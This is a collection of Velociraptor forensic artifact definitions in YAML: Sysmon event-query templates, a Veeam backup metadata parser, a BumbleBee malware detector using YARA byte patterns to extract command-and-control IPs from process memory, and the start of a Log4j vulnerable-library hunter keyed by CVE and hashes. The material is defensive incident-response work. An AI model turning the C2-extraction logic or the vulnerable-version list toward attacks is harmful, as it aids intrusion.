            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID in ( 12, 13, 14 )

      - type: vql_suggestion
        name: 15. FileCreateStreamHash
        template: | 
            /*
            ## 15: FileCreateStreamHash
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.TargetFileName as TargetFileName
                ,EventData.CreationUtcTime as CreationUtcTime
                --,parse_string_with_regex(string=EventData.Hash, regex=["MD5=(?P<MD5>[^,]+)","SHA1=(?P<SHA1>[^,]+)","SHA256=(?P<SHA256>[^,]+)"] ) as Hash
                ,EventData.Hash as Hash
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 15

      - type: vql_suggestion
        name: 17 18. Named Pipes
        template: | 
            /*
            ## 17, 18: Named Pipes
            17: Pipe created
            18: Pipe connected
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.EventType as EventType
                ,EventData.PipeName as PipeName
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID in ( 17,18 )
            
            
            /*
            
      - type: vql_suggestion
        name: 19 20 21. WMI Eventing
        template: |            
            ## 19,20,21: WMI Eventing
            19: WmiEventFilter activity detected.  
            20: WmiEventConsumer activity detected.  
            21: WmiEventConsumerToFilter activity detected.  
            
            Note: some fields for each event will be null.  
            Comment in and out relevant fields.
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.EventType as EventType
                ,EventData.Operation as Operation
                ,EventData.EventNamespace as EventNamespace
                ,EventData.Name as Name
                ,EventData.Query as Query
                ,EventData.Type as Type
                ,EventData.Destination as Destination
                ,EventData.Consumer as Consumer
                ,EventData.Filter as Filter
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID in ( 19,20,21 )

      - type: vql_suggestion
        name: 22. DNS event timeline
        template: |            
            /*
            ## 22: DNSEvent
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.QueryName as QueryName
                ,EventData.QueryStatus as QueryStatus
                ,EventData.QueryResults as QueryResults
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 22

      - type: vql_suggestion
        name: 23. FileDelete
        template: |             
            /*
            ## 23: FileDelete
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.TargetFilename as TargetFilename
                --,parse_string_with_regex(string=EventData.Hashes, regex=["MD5=(?P<MD5>[^,]+)","SHA1=(?P<SHA1>[^,]+)","SHA256=(?P<SHA256>[^,]+)"] ) as Hashes
                ,EventData.Hashes as Hashes
                ,EventData.Archived as Archived
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 23

      - type: vql_suggestion
        name: 24. ClipboardChange
        template: |             
            /*
            ## 24: ClipboardChange
            */
            SELECT EventTime, Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                --,EventData.ProcessGuid as ProcessGuid
                ,EventData.ProcessId as ProcessId
                ,EventData.Image as Image
                ,EventData.User as User
                ,EventData.Session as Session
                ,EventData.ClientInfo as ClientInfo
                --,parse_string_with_regex(string=EventData.Hashes, regex=["MD5=(?P<MD5>[^,]+)","SHA1=(?P<SHA1>[^,]+)","SHA256=(?P<SHA256>[^,]+)"] ) as Hashes
                ,EventData.Hashes as Hashes
                ,EventData.Archived as Archived
                --,EventData
                --,Message
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")
            WHERE EventID = 24

      - type: vql_suggestion
        name: Timesketch format
        template: |                
            SELECT EventTime as datetime
                ,Computer,EventID
                --,Channel,Provider
                --,EventData.RuleName as RuleName
                --,EventData.UtcTime as UtcTime
                ,get(item=dict(
                    `1` = 'Process Create',
                    `2` = 'File creation time changed',
                    `3` = 'Network connection detected',
                    `4` = 'Sysmon service state changed',
                    `5` = 'Process terminated',
                    `6` = 'Driver loaded',
                    `7` = 'Image loaded',
                    `8` = 'CreateRemoteThread detected',
                    `9` = 'RawAccessRead detected',
                    `10` = 'Process accessed',
                    `11` = 'File created',
                    `12` = 'Registry object added or deleted',
                    `13` = 'Registry value set',
                    `14` = 'Registry object renamed',
                    `15` = 'File stream created',
                    `16` = 'Sysmon config state changed',
                    `17` = 'Pipe Created"',
                    `18` = 'Pipe Connected',
                    `19` = 'WmiEventFilter activity detected',
                    `20` = 'WmiEventConsumer activity detected',
                    `21` = 'WmiEventConsumerToFilter activity detected',
                    `22` = 'Dns query',
                    `23` = 'File Delete archived',
                    `24` = 'Clipboard changed',
                    `25` = 'Process Tampering',
                    `26` = 'File Delete logged',
                    `27` = 'File Block Executable',
                    `28` = 'File Block Shredding',
                    `255` = 'Error'),
                    member=str(str=EventID)) as timestamp_desc
                ,Message as message
                --,EventData
            FROM source(artifact="Exchange.Windows.Triage.Sysmon")

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Veeam.RestorePoints.MetadataFiles.yaml
======
name: Windows.Veeam.RestorePoints.MetadataFiles

description: |
  Parses the metadata found in Veeam backup chain metadata files (`.vbm`) to extract relevant fields for each Restore Point.
  
  These files are generated by Veeam Backup & Replication during backup jobs. This artifact accepts metadata from **unencrypted** backups of virtual and physical infrastructures.

author: Synacktiv, Maxence Fossat - @cybiosity

reference:
  - https://www.synacktiv.com/publications/using-veeam-metadata-for-efficient-extraction-of-backup-artefacts-13

type: CLIENT

precondition: SELECT OS FROM info() WHERE OS = 'windows'

parameters:
  - name: BackupRepositories
    description: List of Backup Repositories where ".vbm" files should be looked for.
    type: csv
    default: |
      BackupRepoPath
      C:/BackupRepo1
      D:/BackupRepo2

required_permissions:
  - FILESYSTEM_READ

sources:
  - query: |
      // ============================
      // === Formatting functions ===
      // ============================
      
      // Function to format XML properties
      LET format_properties(Properties) = to_dict(item={ 
          SELECT AttrName AS _key,
                 Value AS _value
            FROM Properties
      })

      // Function to format disk_info capacity for HvAuxData
      LET hv_disk_capacity(Disks) = to_dict(item= {
          SELECT disk_info.CHvVmRctIdentifier.AttrFileId AS _key,
                 disk_info.Attrcapacity AS _value
            FROM Disks
      })

      // Function to format disk_info sizes for HvAuxData
      LET hv_disk_size(Disks) = to_dict(item= {
          SELECT disk_info.extent.Attrfilename AS _key,
                 disk_info.extent.Attrsize AS _value
            FROM Disks
      })
      
      // Function to format CRawDiskInfo sizes for HvAuxData
      LET hv_raw_disk_size(RawDisks) = to_dict(item= {
          SELECT CRawDiskInfo.SourceFileName AS _key,
                 CRawDiskInfo.ValidProcessedOffset AS _value
            FROM RawDisks
      })
      
      // Function to format Disk capacity for DesktopOibAuxData
      LET desktop_disk_capacity(Disks) = to_dict(item= {
          SELECT DevSetupInfo.AttrDevPath AS _key,
                 Capacity AS _value
            FROM Disks
      })
      
      // Function to format Disk sizes for DesktopOibAuxData
      LET desktop_disk_size(Disks) = to_dict(item= {
          SELECT OriginalDiskUniqueId AS _key,
                 Capacity AS _value
            FROM Disks
      })
      
      // Function to format Disk capacity for COibAuxDataVmware
      LET vmware_disk_capacity(Disks) = to_dict(item= {
          SELECT `Uuid` AS _key,
                 Capacity AS _value
            FROM Disks
      })
      
      // Function to format Disk sizes for COibAuxDataVmware
      LET vmware_disk_size(Disks) = to_dict(item= {
          SELECT FlatFileName AS _key,
                 ValidProcessedOffset AS _value
            FROM Disks
      })
      
      // Restore Point type
      LET restore_point_type = dict(
          `0`='Full',
          `1`='Increment'
      )
      
      // Backup encryption state
      LET back_enc_state = dict(
          `0`='Unencrypted',
          `2`='Encrypted'
      )




      // ========================
      // === Initial parsing ====
      // ========================
      
      // Parsing XML for each Veeam backup chain metadata file
      LET backup_repos = SELECT BackupRepoPath FROM BackupRepositories
      LET xml = SELECT * FROM foreach(row=backup_repos,
          query={
              SELECT Name AS MetadataFile, 
                     parse_xml(file=OSPath) AS Metadata
                FROM glob(globs='/**/*.vbm', root=BackupRepoPath, accessor='auto')
          })
      
      // Extracting interesting fields from the parsed metadata
      LET metadata = SELECT MetadataFile,
             Metadata.BackupMeta.BackupMetaInfo.Oibs.OIB AS ObjectsInBackup,
             Metadata.BackupMeta.BackupMetaInfo.Objects.Object AS Objects,
             Metadata.BackupMeta.BackupMetaInfo.Hosts.Host AS Hosts,
             Metadata.BackupMeta.BackupMetaInfo.Storages.Storage AS Storages,
             Metadata.BackupMeta.BackupMetaInfo.Points.Point AS RestorePoints,
             Metadata.BackupMeta.Backup AS Backups
        FROM xml
      

      

      // =========================      
      // === Objects In Backup ===
      // =========================
      
      // Expanding each Object In Backup (OIB) for each vbm file
      LET oibs = SELECT * FROM foreach(row=metadata,
          query={
              SELECT MetadataFile, Objects, Hosts, Storages, RestorePoints, Backups,
                     _value.AttrDisplayName AS DisplayName,
                     _value.AttrVmName AS VMName,
                     _value.AttrState AS State,
                     _value.AttrType AS Type,
                     _value.AttrAlgorithm AS Algorithm,
                     _value.AttrHealthStatus AS HealthStatus,
                     _value.AttrHasIndex AS HasIndex,
                     _value.AttrHasExchange AS HasExchange,
                     _value.AttrHasSharePoint AS HasSharePoint,
                     _value.AttrHasSql AS HasSQL,
                     _value.AttrHasAd AS HasAD,
                     _value.AttrHasOracle AS HasOracle,
                     _value.AttrHasPostgreSql AS HasPostgreSQL,
                     _value.AttrHasVeeamArchiver AS HasVeeamArchiver,
                     _value.AttrIsCorrupted AS IsCorrupted,
                     _value.AttrIsRecheckCorrupted AS IsRecheckCorrupted,
                     _value.AttrIsConsistent AS IsConsistent,
                     _value.AttrNeedHealthCheckRepair AS NeedHealthCheckRepair,
                     _value.AttrIsPartialActiveFull AS IsPartialActiveFull,
                     _value.AttrProductVersion AS ProductVersion,
                     _value.AttrProductVersionFlags AS ProductVersionFlags,
                     _value.AttrProductIsRentalLicense AS ProductIsRentalLicense,
                     _value.AttrObjectId AS ObjectID,
                     _value.AttrStorageId AS StorageID,
                     _value.AttrPointId AS RestorePointID,
                     _value.AttrEffectiveMemoryMb AS TempMemory,
                     timestamp(string=_value.AttrCreationTimeUtc) AS CreationTimeUTC,
                     timestamp(string=_value.AttrCompletionTimeUtc) AS CompletionTimeUTC,
                     humanize(bytes=int(int=_value.AttrApproxSize)) AS ApproximateSize,
                     parse_xml(file=_value.AttrAuxData, accessor='data').COibAuxData AS AuxData,
                     format_properties(
                            Properties = parse_xml(file=_value.AttrGuestInfo, accessor='data').GuestInfo.Property
                         ) AS GuestInfo
                FROM foreach(row=ObjectsInBackup)
          })
      
      // Correlating OIBs with Objects information
      LET oibs_objects = SELECT * FROM foreach(row=oibs,
          query={
              SELECT MetadataFile, Hosts, Storages, RestorePoints, Backups, DisplayName, VMName, State, Type, Algorithm, HealthStatus, HasIndex, HasExchange, HasSharePoint, HasSQL, HasAD, HasOracle, HasPostgreSQL, HasVeeamArchiver, IsCorrupted, IsRecheckCorrupted, IsConsistent, NeedHealthCheckRepair, IsPartialActiveFull, ProductVersion, ProductVersionFlags, ProductIsRentalLicense, StorageID, RestorePointID, CreationTimeUTC, CompletionTimeUTC, ApproximateSize,
                     format(format='%d MiB',
                         args = int(int=TempMemory) || int(int=AuxData.DesktopOibAuxData.SystemConfiguration.RAMInfo.AttrTotalSizeMB))
                      AS Memory,
                     hv_disk_capacity(Disks=AuxData.HvAuxData.disks.disk)
                       + desktop_disk_capacity(Disks=AuxData.DesktopOibAuxData.Disk)
                       + vmware_disk_capacity(Disks=AuxData.COibAuxDataVmware.Disk)
                       AS DisksCapacity,
                     hv_disk_size(Disks=AuxData.HvAuxData.disks.disk)
                       + hv_raw_disk_size(RawDisks=AuxData.HvAuxData.raw_disks.CRawDiskBackupObject)
                       + desktop_disk_size(Disks=AuxData.DesktopOibAuxData.Disk)
                       + vmware_disk_size(Disks=AuxData.COibAuxDataVmware.Disk)
                       AS ExtractableFilesSize,
                     GuestInfo.GuestOsName AS GuestOSName,
                     GuestInfo.GuestOsType AS GuestOSType,
                     GuestInfo.DnsName AS GuestDNSName,
                     GuestInfo.`Ip` AS GuestIP,
                     GuestInfo.ToolsStatus AS GuestToolsStatus,
                     GuestInfo.ToolsVersionStatus AS GuestToolsVersionStatus,
                     _value.AttrViType || 'Physical machine' AS VirtualType,
                     _value.AttrName AS ExtractName,
                     _value.AttrObjectId AS ExtractID,
                     _value.AttrHostId AS HostID
                FROM foreach(row=Objects) WHERE _value.AttrId = ObjectID
          })
      
      // Correlating OIBs with Hosts information
      LET oibs_hosts = SELECT * FROM foreach(row=oibs_objects,
          query={
              SELECT MetadataFile, Storages, RestorePoints, Backups, DisplayName, VMName, State, Type, Algorithm, HealthStatus, HasIndex, HasExchange, HasSharePoint, HasSQL, HasAD, HasOracle, HasPostgreSQL, HasVeeamArchiver, IsCorrupted, IsRecheckCorrupted, IsConsistent, NeedHealthCheckRepair, IsPartialActiveFull, ProductVersion, ProductVersionFlags, ProductIsRentalLicense, StorageID, RestorePointID, CreationTimeUTC, CompletionTimeUTC, ApproximateSize, Memory, DisksCapacity, ExtractableFilesSize, GuestOSName, GuestOSType, GuestDNSName, GuestIP, GuestToolsStatus, GuestToolsVersionStatus, VirtualType, ExtractName, ExtractID,
                     _value.AttrName AS HostName,
                     _value.AttrHostInstanceId AS HostInstanceID
                FROM foreach(row=Hosts) WHERE _value.AttrId = HostID
          })
    
      // Correlating OIBs with Storages information
      LET oibs_storages = SELECT * FROM foreach(row=oibs_hosts,
          query={
              SELECT MetadataFile, RestorePoints, Backups, DisplayName, VMName, State, Type, Algorithm, HealthStatus, HasIndex, HasExchange, HasSharePoint, HasSQL, HasAD, HasOracle, HasPostgreSQL, HasVeeamArchiver, IsCorrupted, IsRecheckCorrupted, IsConsistent, NeedHealthCheckRepair, IsPartialActiveFull, ProductVersion, ProductVersionFlags, ProductIsRentalLicense, RestorePointID, CreationTimeUTC, CompletionTimeUTC, ApproximateSize, Memory, DisksCapacity, ExtractableFilesSize, GuestOSName, GuestOSType, GuestDNSName, GuestIP, GuestToolsStatus, GuestToolsVersionStatus, VirtualType, ExtractName, ExtractID, HostName, HostInstanceID,
                     parse_xml(file=_value.AttrPartialPath, accessor='data').Path.Elements AS BackupFile,
                     _value.AttrFilePath AS BackupFilePath,
                     parse_xml(file=_value.AttrStats, accessor='data').CBackupStats AS Stats
                FROM foreach(row=Storages) WHERE _value.AttrId = StorageID
          })
          
      // Correlating OIBs with Restore Points information
      LET oibs_points = SELECT * FROM foreach(row=oibs_storages,
          query={
              SELECT MetadataFile, Backups, DisplayName, VMName, State, Type, Algorithm, HealthStatus, HasIndex, HasExchange, HasSharePoint, HasSQL, HasAD, HasOracle, HasPostgreSQL, HasVeeamArchiver, IsCorrupted, IsRecheckCorrupted, IsConsistent, NeedHealthCheckRepair, IsPartialActiveFull, ProductVersion, ProductVersionFlags, ProductIsRentalLicense, CreationTimeUTC, CompletionTimeUTC, ApproximateSize, Memory, DisksCapacity, ExtractableFilesSize, GuestOSName, GuestOSType, GuestDNSName, GuestIP, GuestToolsStatus, GuestToolsVersionStatus, VirtualType, ExtractName, ExtractID, HostName, HostInstanceID, BackupFile, BackupFilePath,
                     Stats.BackupSize AS BackupSize,
                     Stats.DataSize AS DataSize,
                     Stats.DedupRatio AS DeduplicationRatio,
                     Stats.CompressRatio AS CompressionRatio,
                     split(string=_value.AttrNum, sep='\\.')[0] AS RestorePointNumber,
                     restore_point_type[_value.AttrType] AS RestorePointType,
                     _value.AttrBackupId AS BackupID
                FROM foreach(row=RestorePoints) WHERE _value.AttrId = RestorePointID
          })
          
      // Correlating OIBs with Backups information
      LET oibs_backups = SELECT * FROM foreach(row=oibs_points,
          query={
              SELECT MetadataFile, DisplayName, VMName, State, Type, Algorithm, HealthStatus, HasIndex, HasExchange, HasSharePoint, HasSQL, HasAD, HasOracle, HasPostgreSQL, HasVeeamArchiver, IsCorrupted, IsRecheckCorrupted, IsConsistent, NeedHealthCheckRepair, IsPartialActiveFull, ProductVersion, ProductVersionFlags, ProductIsRentalLicense, CreationTimeUTC, CompletionTimeUTC, ApproximateSize, Memory, DisksCapacity, ExtractableFilesSize, GuestOSName, GuestOSType, GuestDNSName, GuestIP, GuestToolsStatus, GuestToolsVersionStatus, VirtualType, ExtractName, ExtractID, HostName, HostInstanceID, BackupFile, BackupFilePath, BackupSize, DataSize, DeduplicationRatio, CompressionRatio, RestorePointNumber, RestorePointType,
                     _value.AttrJobName AS JobName,
                     _value.AttrPolicyName AS PolicyName,
                     _value.AttrDirPath AS BackupDirectory,
                     back_enc_state[_value.AttrEncryptionState] AS BackupEncryptionState
                FROM foreach(row=Backups) WHERE _value.AttrId = BackupID
          })

       


      // ===================
      // === Final query ===
      // ===================
      
      SELECT DisplayName,
             CreationTimeUTC,
             CompletionTimeUTC,
             ApproximateSize,
             DisksCapacity,
             RestorePointNumber,
             RestorePointType,
             HostName,
             HostInstanceID,
             BackupFile,
             BackupFilePath,
             ExtractableFilesSize,
             BackupSize,
             DataSize,
             DeduplicationRatio,
             CompressionRatio,
             VirtualType,
             VMName,
             Memory,
             GuestOSName,
             GuestOSType,
             GuestDNSName,
             GuestIP,
             GuestToolsStatus,
             GuestToolsVersionStatus,
             State,
             Type,
             Algorithm,
             HealthStatus,
             HasIndex,
             HasExchange,
             HasSharePoint,
             HasSQL,
             HasAD,
             HasOracle,
             HasPostgreSQL,
             HasVeeamArchiver,
             IsCorrupted,
             IsRecheckCorrupted,
             IsConsistent,
             NeedHealthCheckRepair,
             IsPartialActiveFull,
             ProductVersion,
             ProductVersionFlags,
             ProductIsRentalLicense,
             JobName,
             PolicyName,
             BackupEncryptionState,
             BackupDirectory,
             MetadataFile,
             ExtractName,
             ExtractID
        FROM oibs_backups

---END OF FILE---

======
FILE: /content/exchange/artifacts/BumbleBee.yaml
======
name: Windows.Carving.BumbleBee
author: Angelo Violetti @SEC Defence
type: CLIENT
description: |
        This artficat will detect running BumbleBee processes and subsequently extract the command and control servers with the destination port 443.
reference:
  - sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/
parameters:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
  - name: ProcessRegex
    default: .
  - name: DetectionYara
    default: |
        rule BumbleBee_Unpacked{
            meta:
                author = "Angelo Violetti @ SEC Defence"
                date = "2023-02-23"
            
            strings:
                $s1 = {?? 83 ?? 18 10 72 03 ?? 8B ?? 44 8B ?? 48 8B ?? 48 8D 4C 24 30 E8 ?? ?? FF FF 90}
                $s2 = {48 8D 4C 24 30 E8 ?? ?? FF FF 90}
                $s3 = {48 8d 4c 24 30 e8 ?? ?? FF FF}
            
            condition:
                all of ($s*)
        }
        
  - name: ExtractIPsYara
    default: |
        rule BumbleBee_IPs{
            meta:
                author = "Angelo Violetti @ SEC Defence"
                date = "2023-02-23"
                description = "Extracts the IP addresses with the destination port equal to 443 from BumbleBee processes"
            
            strings:
            $IP = {?? ?? ?? 2e ?? ?? ?? 2e ?? ?? ?? 2e ?? ?? ?? 00 (?? | ?? ??) 00 00 00 00 00 00 00 0f 00 00 00 00 00 00 00 34 34 33 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 00 00 00 00 00 00 0F 00 00 00 00 00 00 00}
          condition:
            $IP
        }

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        -- Find velociraptor process
        LET me <= getpid()

        -- Find all processes and add filters
        LET processes = SELECT Name AS ProcessName, CommandLine, Pid
                        FROM pslist()
                        WHERE Name =~ ProcessRegex
                            AND Pid =~ PidRegex
                            AND NOT Pid in me.Pid

        -- Scan processes in scope with our DetectionYara
        LET processDetections = SELECT * FROM foreach(row=processes,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob="",
                                        then={
                                            SELECT *, ProcessName, CommandLine, Pid, Rule AS YaraRule
                                            FROM proc_yara(pid=Pid, rules=DetectionYara)
                                        })
                                })
                                
        -- Scan the process for the IP addresses
        LET ipaddressDetections = SELECT ProcessName, CommandLine, Pid, Strings.Data AS IPAddresses FROM foreach(row=processDetections, query={SELECT *, ProcessName, CommandLine, Pid FROM proc_yara(pid=Pid, rules=ExtractIPsYara)})
        
        -- Extract the command and control servers
        LET CommandandControlServers = SELECT * FROM foreach(row=ipaddressDetections, query={SELECT ProcessName, CommandLine, Pid, g1 FROM parse_records_with_regex(accessor="data", file=IPAddresses, regex='''(\d+\.\d+\.\d+\.\d+)''')})

        -- Output the command and control servers
        SELECT ProcessName, CommandLine, Pid, str(str=g1) AS BumbleBeeC2 FROM CommandandControlServers

---END OF FILE---

======
FILE: /content/exchange/artifacts/Log4jVulnHunter.yaml
======
name: Generic.Detection.Log4jVulnHunter
author: "Matt Green - @mgreen27"
description: |
    This artifact searches for Vulnerable log4j libraries.

    The artifact:

    * firstly searches for jar, war and ear files
    * then recursively checks content by name then hash for vulnerable
      versions.
    * reports hit details.

    The artifact is optimised to recursively search through embedded
    jar,war and ear files by extracting any discovered jar containers
    to a tempfile on disk.  Select UploadHits to upload Discovered
    file for further analysis.  It is recommended to increase default
    artifact timeout for large servers or target glob.

    Some examples of path glob may include:

    * Specific container: `/path/here/log4j-core-2.0-alpha2.jar`
    * Wildcards: `/var/www/*.{jar,war,ear}`
    * More wildcards: `/var/www/**/*.jar`
    * Windows: `C:/**/*.jar`

    NOTE: this artifact runs the glob plugin with the nosymlink switch
    turned on.  This will NOT follow any symlinks and may cause
    unexpected results if unknowingly targeting a folder with
    symlinks.

reference:
  - https://www.lunasec.io/docs/blog/log4j-zero-day/
  - https://github.com/lunasec-io/lunasec/blob/master/tools/log4shell/findings.json
  - https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes

parameters:
  - name: TargetGlob
    default: "**/*.{jar,war,ear}"
  - name: MaxRecursions
    description: Number of recursions to allow checking inside archives. Default is 10 layers.
    default: 10
    type: int
  - name: UploadHits
    description: Select to upload hits to server.
    type: bool
  - name: IocLookupTable
    type: csv
    default: |
        JarName,FileName,SHA256,JndiFileName,JndiSHA256,Version,Cve,Severity
        log4j-core-2.0-beta9.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-osgi-reduced-2.0-beta9.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-2.0.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,fd6c63c11f7a6b52eff04be1de3477c9ddbbc925022f7216320e6db93f1b7d29,org/apache/logging/log4j/core/lookup/JndiLookup.class,fd6c63c11f7a6b52eff04be1de3477c9ddbbc925022f7216320e6db93f1b7d29,2.0.0,CVE-2021-44228," 10.0"
        log4j-core-2.0-rc1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-osgi-reduced-2.0-rc1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-2.0-rc2.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,a03e538ed25eff6c4fe48aabc5514e5ee687542f29f2206256840e74ed59bcd2,org/apache/logging/log4j/core/lookup/JndiLookup.class,a03e538ed25eff6c4fe48aabc5514e5ee687542f29f2206256840e74ed59bcd2,2.0.0-rc2,CVE-2021-44228," 10.0"
        log4j-core-2.0.1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,2.0.1,CVE-2021-44228," 10.0"
        log4j-core-2.0.2.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,9626798cce6abd0f2ffef89f1a3d0092a60d34a837a02bbe571dbe00236a2c8c,org/apache/logging/log4j/core/lookup/JndiLookup.class,9626798cce6abd0f2ffef89f1a3d0092a60d34a837a02bbe571dbe00236a2c8c,2.0.2,CVE-2021-44228," 10.0"
        log4j-core-2.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.10.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,1fa92c00fa0b305b6bbe6e2ee4b012b588a906a20a05e135cbe64c9d77d676de,org/apache/logging/log4j/core/lookup/JndiLookup.class,5c104d16ff9831b456e4d7eaf66bcf531f086767782d08eece3fb37e40467279,"2.12.0, 2.12.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,1fa92c00fa0b305b6bbe6e2ee4b012b588a906a20a05e135cbe64c9d77d676de,org/apache/logging/log4j/core/lookup/JndiLookup.class,5c104d16ff9831b456e4d7eaf66bcf531f086767782d08eece3fb37e40467279,"2.12.0, 2.12.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,b1960d63a3946f9e16e1920624f37c152b58b98932ed04df99ed5d9486732afb,org/apache/logging/log4j/core/lookup/JndiLookup.class,febbc7867784d0f06934fec59df55ee45f6b24c55b17fff71cc4fca80bf22ebb,2.12.2,CVE-2021-44228," 10.0"
        log4j-core-2.13.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
